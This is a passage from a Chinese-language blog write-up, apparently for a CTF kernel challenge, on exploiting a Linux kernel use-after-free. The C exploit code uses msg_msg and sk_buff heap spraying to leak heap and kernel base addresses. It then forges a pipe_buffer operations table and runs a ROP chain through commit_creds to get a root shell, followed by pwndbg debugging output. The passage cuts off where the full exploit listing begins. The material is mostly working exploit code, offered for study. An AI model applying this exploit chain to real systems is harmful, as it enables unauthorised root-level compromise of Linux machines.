class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>); </span><br><span class="line">		<span class="comment">/* 利用MSG_TAG进行验证 */</span></span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg*)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">		<span class="comment">/* nearby_msg只是指向栈上某片区域的指针 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>越界读取到相邻辅助消息的 header，泄露对应主消息的地址</li>
<li>注意：同样是修改 <code>msg_msg</code>，上一个 <code>peekMsg</code> 就报错了，这里的 <code>peekMsg</code> 没有报错，目前不知道原因</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 伪造msg_msg-&gt;next为nearby_msg-&gt;m_list.prev-8(对应primary-&gt;header) */</span></span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        <span class="comment">/* 因为msg_msg-&gt;m_ts是一个很大的数,所以会启用msg_msgseg</span></span><br><span class="line"><span class="comment">        由于我们伪造了msg_msg-&gt;next,所以msg.mtext的前&quot;0x1000-0x30&quot;字节都没有用</span></span><br><span class="line"><span class="comment">        接下来的0x30字节就是primary-&gt;header */</span></span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg*) &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">	<span class="comment">/* 泄露了primary中的数据,获取对应secondary-&gt;head */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>msg_msg data</code> 的 0x1000-0x30 空间使用完毕后，程序就会根据 <code>msg_msg-&gt;next</code> 来确定 <code>msg_msgseg data</code> 的位置</li>
<li>将 <code>msg_msg-&gt;next</code> 修改为 <code>primary-&gt;header</code>，就可以读取并泄露 <code>primary-&gt;m_list.next</code> ，也就是 <code>secondary-&gt;header</code></li>
<li>最后减去 0x400 就得到 victim_addr 了</li>
</ul>
<p><strong>Step.IV 堆喷 pipe_buffer，泄露内核基址</strong></p>
<p>第二条消息（辅助消息）的大小为 0x400，刚好可以申请 pipe_buffer，它既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, victim_addr, victim_addr, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 这里的victim_addr,SECONDARY_MSG_SIZE-sizeof(struct msg_msg),都是为了后面的readMsg可以成功 */</span></span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* 没有设置MSG_COPY,读取后便会从信息队列中释放secondary_msg</span></span><br><span class="line"><span class="comment">        释放时会进行某些检查,而buildMsg的操作就是为了通过这些检查 */</span></span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;yhellow&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">        <span class="comment">/* 由于命中UAF的secondary_msg被释放,接下来的pipe_buffer也可能申请到这片区域 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *) &amp;fake_secondary_msg; <span class="comment">/* pipe_buf_ptr就是指向fake_secondary_msg的指针 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="comment">/* 由于pipe_buffer和sk_buff分配的区域在同一位置,所以pipe_buffer中的数据会被读取到fake_secondary_msg中 */</span></span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>readMsg 没有设置 MSG_COPY，读取后便会从信息队列中释放 secondary，但是 sk_buff 中的指针并没有置空，也就是说，pipe_buffer 和 sk_buff 分配的区域在同一位置</li>
<li>所以接下来的 read sk_sockets 会把 pipe_buffer 读到 fake_secondary_msg 中</li>
<li>最后通过 <code>pipe_buffer-&gt;ops</code> 获取内核偏移地址</li>
</ul>
<p><strong>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</strong></p>
<p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buf_operations-&gt;release</code> 这一指针</p>
<p>而 UAF object 的地址对我们而言是已知的，因此我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;</span><br><span class="line">pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">ops_ptr = (struct pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>]; <span class="comment">/* 伪造的pipe_buf_operations */</span></span><br><span class="line">ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset; <span class="comment">/* 伪造的pipe_buf_operations-&gt;release */</span></span><br><span class="line"></span><br><span class="line">rop_idx = <span class="number">0</span>;</span><br><span class="line">rop_chain = (<span class="keyword">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">rop_chain[rop_idx++] = user_cs;</span><br><span class="line">rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">rop_chain[rop_idx++] = user_sp;</span><br><span class="line">rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>标准的 ret2usr，利用 commit_creds(prepare_kernel_cred(0)) 进行提取</li>
<li>在 gadget 上打断点，进行调试：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  <span class="number">0xffffffff8e0dbede</span> ◂— push   rsi</span><br><span class="line">*RBX  <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0x0</span></span><br><span class="line">*RDI  <span class="number">0xffff9799c285cd80</span> ◂— <span class="number">0</span></span><br><span class="line">*RSI  <span class="number">0xffff9799c2864800</span> ◂— jns    <span class="number">0xffff9799c286486a</span> <span class="comment">/* 0x776f6c6c656879; &#x27;yhellow&#x27; */</span></span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line">*R9   <span class="number">0xffff9799c22feee0</span> ◂— adc    byte ptr [rcx], <span class="number">4</span> <span class="comment">/* 0x3e800041180 */</span></span><br><span class="line"> R10  <span class="number">0x8</span></span><br><span class="line">*R11  <span class="number">0xffff9799c32d8c10</span> —▸ <span class="number">0xffff9799c1a49ba0</span> —▸ <span class="number">0xffff9799c21c6e40</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x200300000 */</span></span><br><span class="line">*R12  <span class="number">0xffff9799c285cd80</span> ◂— <span class="number">0</span></span><br><span class="line">*R13  <span class="number">0xffff9799c22fef68</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0xc000000000000 */</span></span><br><span class="line"> R14  <span class="number">0xffff9799c1a49ba0</span> —▸ <span class="number">0xffff9799c21c6e40</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x200300000 */</span></span><br><span class="line">*R15  <span class="number">0xffff9799c2308f00</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x240500000 */</span></span><br><span class="line">*RBP  <span class="number">0xffffa3aa004e3de0</span> —▸ <span class="number">0xffffa3aa004e3e08</span> —▸ <span class="number">0xffffa3aa004e3e30</span> —▸ <span class="number">0xffffa3aa004e3e68</span> —▸ <span class="number">0xffffa3aa004e3e78</span> ◂— ...</span><br><span class="line">*RSP  <span class="number">0xffffa3aa004e3dc8</span> —▸ <span class="number">0xffffffff8e1275fb</span> ◂— add    ebx, <span class="number">1</span></span><br><span class="line">*RIP  <span class="number">0xffffffff8e0dbede</span> ◂— push   rsi</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0xffffffff8e0dbede</span>    push   rsi</span><br><span class="line">   <span class="number">0xffffffff8e0dbedf</span>    pop    rsp</span><br><span class="line">   <span class="number">0xffffffff8e0dbee0</span>    test   edx, edx</span><br><span class="line">   <span class="number">0xffffffff8e0dbee2</span>    jle    <span class="number">0xffffffff8e0dbf88</span>            &lt;<span class="number">0xffffffff8e0dbf88</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xffffffff8e0dbf88</span>    ud2    </span><br><span class="line">   <span class="number">0xffffffff8e0dbf8a</span>    mov    eax, <span class="number">0xffffffea</span></span><br><span class="line">   <span class="number">0xffffffff8e0dbf8f</span>    jmp    <span class="number">0xffffffff8e0dbf2c</span>            &lt;<span class="number">0xffffffff8e0dbf2c</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xffffffff8e0dbf2c</span>    pop    rbx</span><br><span class="line">   <span class="number">0xffffffff8e0dbf2d</span>    pop    r12</span><br><span class="line">   <span class="number">0xffffffff8e0dbf2f</span>    pop    r13</span><br><span class="line">   <span class="number">0xffffffff8e0dbf31</span>    pop    rbp</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xffffa3aa004e3dc8</span> —▸ <span class="number">0xffffffff8e1275fb</span> ◂— add    ebx, <span class="number">1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffffa3aa004e3dd0</span> —▸ <span class="number">0xffff9799c22feee0</span> ◂— adc    byte ptr [rcx], <span class="number">4</span> <span class="comment">/* 0x3e800041180 */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffffa3aa004e3dd8</span> —▸ <span class="number">0xffff9799c285cd80</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│ rbp <span class="number">0xffffa3aa004e3de0</span> —▸ <span class="number">0xffffa3aa004e3e08</span> —▸ <span class="number">0xffffa3aa004e3e30</span> —▸ <span class="number">0xffffa3aa004e3e68</span> —▸ <span class="number">0xffffa3aa004e3e78</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffffa3aa004e3de8</span> —▸ <span class="number">0xffffffff8e12769c</span> ◂— pop    rbx</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0xffffa3aa004e3df0</span> —▸ <span class="number">0xffff9799c32d8c00</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0xffffa3aa004e3df8</span> —▸ <span class="number">0xffff9799c285cd80</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0xffffa3aa004e3e00</span> —▸ <span class="number">0xffff9799c22feee0</span> ◂— adc    byte ptr [rcx], <span class="number">4</span> <span class="comment">/* 0x3e800041180 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>寄存器 RSI 中就是我们布置的 ROP 链</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff9799c2864800</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi <span class="number">0xffff9799c2864800</span> ◂— jns    <span class="number">0xffff9799c286486a</span> <span class="comment">/* 0x776f6c6c656879; &#x27;yhellow&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffff9799c2864808</span> —▸ <span class="number">0xffff9799c2864800</span> ◂— jns    <span class="number">0xffff9799c286486a</span> <span class="comment">/* 0x776f6c6c656879; &#x27;yhellow&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffff9799c2864810</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0xffff9799c2864818</span> ◂— <span class="number">0x3d0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffff9799c2864820</span> —▸ <span class="number">0xffffffff8de938f0</span> ◂— pop    rdi</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0xffff9799c2864828</span> —▸ <span class="number">0xffffffff8fa6d580</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0xffff9799c2864830</span> —▸ <span class="number">0xffffffff8ded25c0</span> ◂— nop    dword ptr [rax + rax]</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0xffff9799c2864838</span> —▸ <span class="number">0xffffffff8ea01006</span> ◂— mov    rdi, rsp</span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xffff9799c2864840</span> ◂— jns    <span class="number">0xffff9799c28648aa</span> <span class="comment">/* 0x776f6c6c656879; &#x27;yhellow&#x27; */</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0xffff9799c2864848</span> ◂— jns    <span class="number">0xffff9799c28648b2</span> <span class="comment">/* 0x776f6c6c656879; &#x27;yhellow&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0xffff9799c2864850</span> —▸ <span class="number">0x401e87</span> ◂— push   rbp</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0xffff9799c2864858</span> ◂— <span class="number">0x33</span> <span class="comment">/* &#x27;3&#x27; */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0xffff9799c2864860</span> ◂— <span class="number">0x246</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0xffff9799c2864868</span> —▸ <span class="number">0x7fffe7eb2ad0</span> —▸ <span class="number">0x7fffe7eb7400</span> —▸ <span class="number">0x403950</span> ◂— endbr64 </span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0xffff9799c2864870</span> ◂— <span class="number">0x2b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0xffff9799c2864878</span> ◂— <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span 